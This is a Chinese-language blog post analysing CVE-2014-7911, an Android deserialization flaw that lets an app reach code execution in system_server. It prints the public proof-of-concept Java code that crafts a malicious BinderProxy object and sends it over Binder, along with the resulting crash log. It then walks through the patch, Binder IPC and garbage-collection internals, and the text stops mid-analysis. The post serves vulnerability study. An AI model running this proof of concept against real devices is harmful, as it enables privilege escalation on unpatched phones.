<!DOCTYPE html><html lang="en"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content="水中月.镜中花.浮华一片苍凉.."><title>CVE-2014-7911安卓本地提权漏洞分析 | idhyt's blog</title><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/normalize/4.2.0/normalize.min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/pure/0.6.0/pure-min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/pure/0.6.0/grids-responsive-min.css"><link rel="stylesheet" type="text/css" href="/css/style.css?v=0.0.0"><link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.bootcss.com/jquery/3.0.0/jquery.min.js"></script><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"><link rel="alternate" type="application/atom+xml" href="/atom.xml"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">CVE-2014-7911安卓本地提权漏洞分析</h1><a id="logo" href="/.">idhyt's blog</a><p class="description">云淡风轻</p></div><div id="nav-menu"><a href="/." class="current"><i class="fa fa-home"> Home</i></a><a href="/archives/"><i class="fa fa-archive"> Archive</i></a><a href="/about/"><i class="fa fa-user"> About</i></a><a href="/atom.xml"><i class="fa fa-rss"> RSS</i></a></div></div><div id="layout" class="pure-g"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">CVE-2014-7911安卓本地提权漏洞分析</h1><div class="post-meta">Jul 31, 2015<span> | </span><span class="category"><a href="/categories/exploit/">exploit</a></span></div><a data-disqus-identifier="2015/07/31/exploit-cve-2014-7911/" href="/2015/07/31/exploit-cve-2014-7911/#disqus_thread" class="disqus-comment-count"></a><div class="post-content"><h2 id="简介">简介</h2><p>CVE-2014-7911是由Jann Horn发现的一个有关安卓的提权漏洞，该漏洞允许恶意应用从普通应用权限提权到system用户执行命令，影响版本包括4.4以前所有的版本。该漏洞是一个非常有学习价值的漏洞，其涉及的知识非常广泛，包括Java序列化与反序列化、Dalvik GC机制、Android binder机制、heap spary、ROP、stack pivot。</p>
<p>该漏洞的成因在于java.io.ObjectInputStream类在反序列化输入的数据时，并不验证其合法性，攻击者可以利用此漏洞构造恶意对象在sysem_server进程中执行任意代码并获取提升的权限。但是我google大部分关于这个漏洞的文章，没有一个分析文章能将漏洞的触发流程与这个点串起来的逻辑，或者说文章中根本就没有在提及这个点，这个过程发生在sysem_server处理Parcel数据的时候有个unparcel过程，下边会有详细的逻辑流程。</p>
<h2 id="调试环境和工具">调试环境和工具</h2><p>nexus 5<br>android 4.4<br>android studio</p>
<h2 id="漏洞触发">漏洞触发</h2><h3 id="触发">触发</h3><p>先下载漏洞<a href="http://seclists.org/fulldisclosure/2014/Nov/51" target="_blank" rel="external">poc</a>编译过后安装到手机中，一定要拿实体机测试，在genymotion等虚拟机中无法通过反射获取到系统服务。</p>
<p>清除日志 adb logcat -c<br>开启日志 adb logcat<br>运行poc，手机重启，查看崩溃日志</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--------- beginning of /dev/log/main&#10;I/System.out(10603): 1 inner classes found&#10;I/System.out(10603): 1 inner classes found&#10;D/audio_hw_primary( 8448): select_devices: out_snd_device(2: speaker) in_snd_device(0: )&#10;--------- beginning of /dev/log/system&#10;E/UserManagerService( 8753): Error writing application restrictions list&#10;D/dalvikvm( 8753): GC_FOR_ALLOC freed 134K, 4% free 24602K/25472K, paused 32ms, total 32ms&#10;F/libc    ( 8753): Fatal signal 11 (SIGSEGV) at 0x1337bef3 (code=1), thread 8761 (FinalizerDaemon)&#10;D/dalvikvm( 8753): GC_FOR_ALLOC freed 856K, 7% free 24582K/26312K, paused 31ms, total 31ms&#10;D/dalvikvm( 8753): GC_FOR_ALLOC freed 836K, 7% free 24582K/26312K, paused 35ms, total 35ms&#10;I/ActivityManager( 8753): START u0 &#123;act=android.intent.action.MAIN cat=[android.intent.category.HOME] flg=0x10200000 cmp=com.google.android.googlequicksearchbox/com.google.android.launcher.GEL&#125; from pid 8753&#10;D/audio_hw_primary( 8448): select_devices: out_snd_device(2: speaker) in_snd_device(0: )&#10;I/DEBUG   (  175): *** *** *** *** *** *** *** *** *** *** *** *** *** *** *** ***&#10;I/DEBUG   (  175): Build fingerprint: &#39;google/hammerhead/hammerhead:4.4.4/KTU84P/1227136:user/release-keys&#39;&#10;I/DEBUG   (  175): Revision: &#39;11&#39;&#10;I/DEBUG   (  175): pid: 8753, tid: 8761, name: FinalizerDaemon  &#62;&#62;&#62; system_server &#60;&#60;&#60;&#10;I/DEBUG   (  175): signal 11 (SIGSEGV), code 1 (SEGV_MAPERR), fault addr 1337bef3&#10;I/DEBUG   (  175):     r0 1337beef  r1 401899d9  r2 71082008  r3 6d468dc4&#10;I/DEBUG   (  175):     r4 401899d9  r5 1337beef  r6 713c12e8  r7 1337beef&#10;I/DEBUG   (  175):     r8 1337beef  r9 746daf68  sl 71082018  fp 74a7eb24&#10;I/DEBUG   (  175):     ip 401c18a4  sp 74a7eae8  lr 40188981  pc 400d6176  cpsr 200f0030&#10;I/DEBUG   (  175):     d0  0000000000000001  d1  0000000000000000&#10;I/DEBUG   (  175):     d2  6d4aece800000000  d3  0000010000000000&#10;I/DEBUG   (  175):     d4  0000000000000000  d5  0000000000000000&#10;I/DEBUG   (  175):     d6  0000000000000000  d7  42c800004bb98bb4&#10;I/DEBUG   (  175):     d8  0000000000000000  d9  0000000000000000&#10;I/DEBUG   (  175):     d10 0000000000000000  d11 0000000000000000&#10;I/DEBUG   (  175):     d12 0000000000000000  d13 0000000000000000&#10;I/DEBUG   (  175):     d14 0000000000000000  d15 0000000000000000&#10;I/DEBUG   (  175):     d16 ffffffff00000013  d17 00000006ffffffff&#10;I/DEBUG   (  175):     d18 0000000000000000  d19 0000000000000000&#10;I/DEBUG   (  175):     d20 0000000000000000  d21 0002000200020002&#10;I/DEBUG   (  175):     d22 0000000000000000  d23 0000000000000000&#10;I/DEBUG   (  175):     d24 0000000000000000  d25 0002a7600002a760&#10;I/DEBUG   (  175):     d26 0707070703030303  d27 0300000004000000&#10;I/DEBUG   (  175):     d28 0800000009000000  d29 0001000000010000&#10;I/DEBUG   (  175):     d30 010b400001088000  d31 01108000010e0000&#10;I/DEBUG   (  175):     scr 60000010&#10;I/DEBUG   (  175):&#10;I/DEBUG   (  175): backtrace:&#10;I/DEBUG   (  175):     #00  pc 0000d176  /system/lib/libutils.so (android::RefBase::decStrong(void const*) const+3)&#10;I/DEBUG   (  175):     #01  pc 0007097d  /system/lib/libandroid_runtime.so&#10;I/DEBUG   (  175):     #02  pc 0001dbcc  /system/lib/libdvm.so (dvmPlatformInvoke+112)&#10;I/DEBUG   (  175):     #03  pc 0004e123  /system/lib/libdvm.so (dvmCallJNIMethod(unsigned int const*, JValue*, Method const*, Thread*)+398)&#10;I/DEBUG   (  175):     #04  pc 00026fe0  /system/lib/libdvm.so&#10;I/DEBUG   (  175):     #05  pc 0002dfa0  /system/lib/libdvm.so (dvmMterpStd(Thread*)+76)&#10;I/DEBUG   (  175):     #06  pc 0002b638  /system/lib/libdvm.so (dvmInterpret(Thread*, Method const*, JValue*)+184)&#10;I/DEBUG   (  175):     #07  pc 0006057d  /system/lib/libdvm.so (dvmCallMethodV(Thread*, Method const*, Object*, bool, JValue*, std::__va_list)+336)&#10;I/DEBUG   (  175):     #08  pc 000605a1  /system/lib/libdvm.so (dvmCallMethod(Thread*, Method const*, Object*, JValue*, ...)+20)&#10;I/DEBUG   (  175):     #09  pc 00055287  /system/lib/libdvm.so&#10;I/DEBUG   (  175):     #10  pc 0000d170  /system/lib/libc.so (__thread_entry+72)&#10;I/DEBUG   (  175):     #11  pc 0000d308  /system/lib/libc.so (pthread_create+240)&#10;...</span><br></pre></td></tr></table></figure>
<h3 id="崩溃日志">崩溃日志</h3><p>简单说下崩溃日志格式</p>
<ol>
<li>ndk crash log以<strong><em> </em></strong> <strong><em> </em></strong> <em>*</em>开始. </li>
<li>第一行Build fingerprint: ‘google/hammerhead/hammerhead:4.4.4/KTU84P/1227136:user/release-keys’ 指明了运行的Android版本, 如果您有多份crash dump的话这个信息就比较有用了。</li>
<li>接着一行显示的是当前的线程id(pid)和进程id(tid). 如果当前崩溃的线程是主线程的话, pid和tid会是一样的。</li>
<li>第四行, 显示的是unix信号. 这里的signal 11，即SIGSEGV，表示段错误，是最常见的信号。(SIGSEGV自行google) </li>
<li>接下来的部分是系统寄存器的dump信息。</li>
<li>Crash dump还包含PC之前和之后的一些内存字段. </li>
<li>最后是崩溃时的调用堆栈，如果你执行的是debug版本，还能还原一些c++代码。</li>
</ol>
<h3 id="几个重要的寄存器">几个重要的寄存器</h3><ol>
<li>r0-r3 用作传入函数参数，传出函数返回值。当参数不超过4个时,可以使用寄存器R0~R3来进行参数传递，当参数超过4个时，使用数据栈来传递参数；结果为一个32位的整数时，通过寄存器r0返回；结果为一个64位整数时，通过寄存器r0，r1返回。另外很重要的一点，在C++中，第一个参数就是this指针，所以this指针是存放在r0中的。</li>
<li>r4-r11 被用来存放函数的局部变量。</li>
<li>fp (or r11) 指向当前正在执行的函数的堆栈底。</li>
<li>sp (or r13) 当前正在执行的函数的堆栈顶.(跟fp相对应)</li>
<li>lr (or r14) link register. 简单来说，当当前指令执行完了，就会从这个寄存器获取地址，来知道需要返回，到哪里继续执行。</li>
<li>pc (or r15) program counter. 程序计数器。</li>
</ol>
<h2 id="漏洞POC分析">漏洞POC分析</h2><p>从上边崩溃日志中看出，system_server执行到0x1337bef3地址后触发<code>Error writing application restrictions list</code>写错误，最终造成了崩溃。</p>
<h3 id="漏洞触发过程">漏洞触发过程</h3><p>结合崩溃信息看poc源码，源码触发过程如下：</p>
<p>1.创建可序列化的对象AAdroid.os.BinderProxy并将其放入Bundle数据中。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Bundle bundle = <span class="keyword">new</span> Bundle();</span><br><span class="line">BinderProxy evilProxy = <span class="keyword">new</span> BinderProxy();</span><br><span class="line">evilProxy.mOrgue = staticAddr;</span><br><span class="line">evilProxy.mObject = staticAddr;</span><br><span class="line">bundle.putSerializable(<span class="string">"eatthis"</span>, evilProxy);</span><br></pre></td></tr></table></figure>
<p>类AAdroid.os.BinderProxy代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BinderProxy</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> mObject = <span class="number">0x1337beef</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> mOrgue = <span class="number">0x1337beef</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注意其中两个可控的成员变量mObject和mOrgue分别赋值0x1337beef，正是崩溃点。</p>
<p>2.通过一系列java的反射机制，获得跨进程调用system_server的IBinder接口mRemote，为与system_server的跨进程通信做准备。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取类对象android.os.IUserManager.Stub</span></span><br><span class="line">Class stubClass = <span class="keyword">null</span>;</span><br><span class="line">Class[] umSubclasses = Class.forName(<span class="string">"android.os.IUserManager"</span>).getDeclaredClasses();</span><br><span class="line">System.out.println(umSubclasses.length + <span class="string">" inner classes found"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (Class inner : umSubclasses) &#123;</span><br><span class="line">    <span class="keyword">if</span> (inner.getCanonicalName().equals(<span class="string">"android.os.IUserManager.Stub"</span>)) &#123;</span><br><span class="line">        stubClass = inner;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取对象android.os.IUserManager.Stub中TRANSACTION_setApplicationRestrictions的值用于transact()</span></span><br><span class="line">Field TRANSACTION_setApplicationRestrictionsField = stubClass.getDeclaredField(<span class="string">"TRANSACTION_setApplicationRestrictions"</span>);</span><br><span class="line">TRANSACTION_setApplicationRestrictionsField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">TRANSACTION_setApplicationRestrictions = TRANSACTION_setApplicationRestrictionsField.getInt(<span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取类对象android.os.IUserManager.Stub.Proxy</span></span><br><span class="line">Class proxyClass = <span class="keyword">null</span>;</span><br><span class="line">Class[] umStubclasses = stubClass.getDeclaredClasses();</span><br><span class="line">System.out.println(umStubclasses.length + <span class="string">" inner classes found"</span>);</span><br><span class="line"><span class="keyword">for</span> (Class inner : umStubclasses) &#123;</span><br><span class="line">    <span class="keyword">if</span> (inner.getCanonicalName().equals(<span class="string">"android.os.IUserManager.Stub.Proxy"</span>)) &#123;</span><br><span class="line">        proxyClass = inner;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取UserManager类对象实例</span></span><br><span class="line">UserManager userManager = (UserManager) context.getSystemService(Context.USER_SERVICE);</span><br><span class="line"><span class="comment">// 获取UserManager类对象中mService对象, 类型为IUserManager</span></span><br><span class="line">Field mServiceField = UserManager.class.getDeclaredField(<span class="string">"mService"</span>);</span><br><span class="line">mServiceField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"><span class="comment">// 获取UserManager类对象实例中的mService对象值</span></span><br><span class="line">Object mService = mServiceField.get(userManager);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取类对象android.os.IUserManager.Stub.Proxy中的mRemote对象</span></span><br><span class="line">Field mRemoteField = proxyClass.getDeclaredField(<span class="string">"mRemote"</span>);</span><br><span class="line">mRemoteField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"><span class="comment">// 获取获取类型为IUserManager的实例对象mService对象值</span></span><br><span class="line">mRemote = (IBinder) mRemoteField.get(mService);</span><br></pre></td></tr></table></figure>
<p>3.调用setApplicationRestrictions函数，传入之前打包evilproxy的Bundle数据作为参数。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">setApplicationRestrictions</span><span class="params">(java.lang.String packageName, android.os.Bundle restrictions, <span class="keyword">int</span></span><br><span class="line">            userHandle)</span> <span class="keyword">throws</span> android.os.RemoteException </span>&#123;</span><br><span class="line">    android.os.Parcel _data = android.os.Parcel.obtain();</span><br><span class="line">    android.os.Parcel _reply = android.os.Parcel.obtain();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        _data.writeInterfaceToken(DESCRIPTOR);</span><br><span class="line">        _data.writeString(packageName);</span><br><span class="line">        _data.writeInt(<span class="number">1</span>);</span><br><span class="line">        restrictions.writeToParcel(_data, <span class="number">0</span>);</span><br><span class="line">        _data.writeInt(userHandle);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] data = _data.marshall();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; <span class="keyword">true</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (data[i] == <span class="string">'A'</span> &amp;&amp; data[i+<span class="number">1</span>] == <span class="string">'A'</span> &amp;&amp; data[i+<span class="number">2</span>] == <span class="string">'d'</span> &amp;&amp; data[i+<span class="number">3</span>] == <span class="string">'r'</span>) &#123;</span><br><span class="line">                data[i] = <span class="string">'a'</span>;</span><br><span class="line">                data[i+<span class="number">1</span>] = <span class="string">'n'</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        _data.recycle();</span><br><span class="line">        _data = Parcel.obtain();</span><br><span class="line">        _data.unmarshall(data, <span class="number">0</span>, data.length);</span><br><span class="line"></span><br><span class="line">        mRemote.transact(TRANSACTION_setApplicationRestrictions, _data, _reply, <span class="number">0</span>);</span><br><span class="line">        _reply.readException();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">finally</span> &#123;</span><br><span class="line">        _reply.recycle();</span><br><span class="line">        _data.recycle();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>将该函数与Android源码中的Android.os.IUserManager.Stub.Proxy.setApplicationRestrictions函数对比，主要的区别在于将传入的Bundle数据进行了修改，将之前可序列化的AAdroid.os.BinderProxy对象修改为了不可序列化的Android.os.BinderProxy对象，这样就将不可序列化的Bundles数据，通过Binder跨进程调用，传入system_server中，system_server在处理这些数据时造成异常崩溃。</p>
<h3 id="进程间通信">进程间通信</h3><h4 id="Binder">Binder</h4><p>通过POC知道造成崩溃行为的代码为mRemote.transact(TRANSACTION_setApplicationRestrictions, _data, _reply, 0)，这里就涉及到进程间通信，在Android中，Binder用于完成进程间通信（IPC），即把多个进程关联在一起，以下摘自网络：</p>
<blockquote>
<p>Binder是一种架构，这种架构提供了服务端接口、Binder驱动、客户端接口三个模块。<br>　　服务端：一个Binder服务端实际上就是一个Binder类的对象，该对象一旦创建，内部就启动一个隐藏线程。该线程接下来会接收Binder驱动发送的消息，收到消息后，会执行到Binder对象中的onTransact()函数，并按照该函数的参数执行不同的服务代码。因此，要实现一个Binder服务，就必须重载onTransact()方法。重载onTransact()函数的主要内容是把onTransact()函数的参数转换为服务函数的参数，而onTransact()函数的参数来源是客户端调用transact()函数时输入的，因此，如果transact()有固定格式的输入，那么onTransact()就会有固定格式的输出。<br>　　Binder驱动：任意一个服务端Binder对象被创建时，同时会在Binder驱动中创建一个mRemote对象，该对象的类型也是Binder类。客户端要访问远程服务时，都是通过mRemote对象。<br>　　客户端：客户端要想访问远程服务，必须获取远程服务在Binder对象中对应的mRemote引用，获得该mRemote对象后，就可以调用其transact()方法，而在Binder驱动中，mRemote对象也重载了transact()方法，重载的内容主要包括以下几项：1. 以线程间消息通信的模式，向服务端发送客户端传递过来的参数。2. 挂起当前线程，当前线程正是客户端线程，并等待服务端线程执行完指定服务函数后通知(notify)。3. 接收到服务端线程的通知，然后继续执行客户端线程，并返回到客户端代码区。</p>
</blockquote>
<p>通过上边简短的介绍，我们知道，要想使用服务端，首先要获取服务端在Binder驱动中对应的mRemote变量的引用，在POC中通过反射方式获得。<br>获得该变量的引用后，就可以调用该变量的transact()方法。该方法的函数原型：public final boolean transact(int code, Parcel data, Parcel reply,int flags)，其中data表示的是要传递给远程Binder服务的包裹(Parcel)，远程服务函数所需要的参数必须放入这个包裹中。包裹中只能放入特定类型的变量，这些类型包括常用的原子类型，比如String、int、long等，要查看包裹可以放入的全部数据类型，可以参照Parcel类。除了一般的原子变量外，Parcel还提供了一个writeParcel()方法，可以在包裹中包含一个小包裹。因此，要进行Binder远程服务调用时，服务函数的参数要么是一个原子类，要么必须继承于Parcel类，否则，是不能传递的。这也是为什么最开始要创建一个可序列化的对象AAdroid.os.BinderProxy并将其放入Bundle数据中。</p>
<p>网上关于进程间通信的资料大部分都是又臭又长，如果想快速了解推荐一篇文章 <a href="http://www.cnblogs.com/noTice520/archive/2012/11/01/2750209.html" target="_blank" rel="external">android中的跨进程通信的实现（一）——远程调用过程和aidl</a></p>
<h4 id="service_manager和binder_service">service manager和binder service</h4><p>Binder是android系统中实现跨进程通信(IPC)的一种重要机制。service manager是所有binder service的管理者，但它并不是这些binder service的创建者。这些binder service有些是init进程启动的服务创建的，有些是system_server进程创建的，但是service manager会管理所有binder service的信息，方便client查询以及调用。</p>
<p>service manager是由init进程直接启动的，ActivityManagerService，PackageManagerService等系统的基本服务(frameworks\base\services\java\com\android\server源码路径里的服务类)由system_server进程启动的。binder service实际上并没有单独的进程，它们只是system_server的一个子线程。init进程会启动surface flinger，media server, drmserver等服务，在这些服务里会创建binder service，并注册到service manager。</p>
<p>native binder service 和 java 层的binder service，都会交由service manager注册，然后由service manager管理。客户端使用binder service时需要向service manager查询得到binder service在当前进程的一个代理proxy，通过代理与binder service的服务端交互。</p>
<h3 id="漏洞触发过程中数据的parcel和unparcel">漏洞触发过程中数据的parcel和unparcel</h3><p>进程间传递Parcel类型数据，一端通过writeToParcel将对象映射成Parcel对象传递出去，另一端再通过createFromParcel将Parcel对象映射回原始对象进行处理。可以将Parcel看成是一个流，通过writeToParcel把对象写到流里面，在通过createFromParcel从流里读取对象。</p>
<p>然后看POC中修改过的不可反序列化的parcel对象Android.os.BinderProxy的处理过程，接POC最后执行流程，执行过mRemote.transact(TRANSACTION_setApplicationRestrictions, _data, _reply, 0)过后，system_server层会去调用IUserManager.onTransact()方法，来到case TRANSACTION_setApplicationRestrictions分支开始处理传进来的parcel数据流：</p>
<p>先是_arg1 = android.os.Bundle.CREATOR.createFromParcel(data)读取数据对象，然后调用this.setApplicationRestrictions(_arg0, _arg1, _arg2);然后转入UserManagerService，UserManagerService继承IUserManager.Stub并实现了setApplicationRestrictions方法，下边的调用流程为(跟着参数_arg1也就是修改过不可反序列化的对象走)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&gt; IUserManager.Stub.Proxy.setApplicationRestrictions(_arg0, _arg1, _arg2) -&gt;</span><br><span class="line">UserManagerService.setApplicationRestrictions -&gt;</span><br><span class="line">UserManagerService.writeApplicationRestrictionsLocked -&gt;</span><br><span class="line">Bundle.keySet()(restrictions.keySet()) -&gt;</span><br><span class="line">Bundle.unparcel() -&gt;</span><br><span class="line">Parcel.readArrayMapInternal() -&gt;</span><br><span class="line">Parcel.readValue(ClassLoader) -&gt;</span><br><span class="line">Parcel.readSerializable(ClassLoader) -&gt;</span><br><span class="line">ObjectInputStream.readObject() -&gt;</span><br><span class="line">ObjectInputStream.readNonPrimitiveContent() -&gt;</span><br><span class="line">ObjectInputStream.readNewObject() -&gt;</span><br></pre></td></tr></table></figure>
<p>对比之前版本知道，最后classDesc.checkAndGetTcObjectClass()这里就是补丁代码了，进去checkAndGetTcObjectClass()看到上边几行注释</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span><br><span class="line"> * Checks the local class to make sure it is valid for &#123;<span class="doctag">@link</span> ObjectStreamConstants#TC_OBJECT&#125;</span><br><span class="line"> * deserialization. Also performs some sanity checks of the stream data. This method is used</span><br><span class="line"> * during deserialization to confirm the local class is likely to be compatible with the coming</span><br><span class="line"> * stream data, but before an instance is instantiated.</span><br><span class="line"> *</span><br><span class="line"> * <span class="doctag">@hide</span> used internally during deserialization</span><br><span class="line"> */</span></span><br></pre></td></tr></table></figure>
<p>注释也很清楚了说明了，这是加的一个补丁，在数据被实例化之前，用来检测对象是否可被反序列化。<br>更详细的补丁代码可以查看：<a href="https://github.com/CyanogenMod/android_libcore/commit/2d0fbea07c1a3c4368ddb07609d1a86993ed6de9" target="_blank" rel="external">2d0fbea07c1a3c4368ddb07609d1a86993ed6de9</a></p>
<h2 id="漏洞分析">漏洞分析</h2><p>回过头来看crash dump信息，根据backtrace显示的堆栈调用最后调用了<code>/system/lib/libutils.so (android::RefBase::decStrong(void const*) const+3)</code>。</p>
<h3 id="Android指针管理">Android指针管理</h3><p>Android中通过引用计数来实现智能指针，并且实现有强指针与弱指针。由对象本身来提供引用计数器，但是对象不会去维护引用计数器的值，而是由智能指针来管理。要达到所有对象都可用引用计数器实现智能指针管理的目标，可以定义一个公共类，提供引用计数的方法，所有对象都去继承这个公共类，这样就可以实现所有对象都可以用引用计数来管理的目标，在Android中，这个公共类就是RefBase。</p>
<p>RefBase作为公共基类提供了引用计数的方法，但是并不去维护引用计数的值，而是由两个智能指针来进行管理：sp(Strong Pointer)和wp(Weak Pointer)，代表强引用计数和弱引用计数。RefBase提供了incStrong与decStrong函数用于控制强引用计数值，其弱引用计数值是由weakref_impl控制，强引用计数与弱引用数都保存在weakref_impl *类型的成员变量mRefs中。</p>
<p>当sp销毁时其析构函数调用对象即RefBase的decStrong函数，decStrong中将强引用数与弱引用数同时减1，如果这是最后一个强引用的话，会调用对象的onLastStrongRef，并且判断成员变量mRefs的成员变量mFlags来决定是否在对象的强引用数为0时释放对象。</p>
<h3 id="GC机制">GC机制</h3><p>简单介绍一下Java对象的生命周期与垃圾回收(摘自网络)：</p>
<p>创建对象的方式：</p>
<ul>
<li>用new语句创建对象。</li>
<li>使用反射，调用java.lang.Class或java.lang.reflect.Constructor的newInstance()实例方法。</li>
<li>调用对象的clone()方法</li>
<li>使用反序列化手段，调用java.io.ObjectInputStream对象的readObject()方法。</li>
</ul>
<p>垃圾回收和对象的可触及性：</p>
<ul>
<li>可触及状态：当一个对象被创建后，只要程序中还有引用变量引用该对象，那么它就始终处于可触及状态。</li>
<li>可复活状态：当程序不再有任何引用变量引用对象时，它就进入可复活状态。该状态的对象，垃圾回收器会准备释放它占用的内存，在释放前，会调用它的finalize()方法，这些finalize()方法有可能使对象重新转到可触及状态。</li>
<li>不可触及状态：当JVM执行完所有的可复活状态的finalize()方法后，假如这些方法都没有使对象转到可触及状态。那么该对象就进入不可触及状态。只有当对象处于不可触及状态时，垃圾回收器才会真正回收它占用的内存。</li>
</ul>
<h3 id="漏洞成因">漏洞成因</h3><p>通过RefBase和GC机制的简单了解得知该处崩溃是由于对象销毁触发GC处理过程，当system_server对传进来的对象进行反序列化后就创建了对象，启动Activity后将其最小化，触发GC，由于该对象并没有任何引用，GC清理时就会调用该对象的finalize方法，即调用了Android.os.BinderProxy的finalize方法，然后会调用destroy()，destroy()为native方法。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="annotation">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">finalize</span><span class="params">()</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        destroy();</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">super</span>.finalize();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">native</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure>
<p>定位到<a href="https://android.googlesource.com/platform/frameworks/base/+/f76a50c/core/jni/android_util_Binder.cpp" target="_blank" rel="external">android_os_BinderProxy_destroy</a></p>
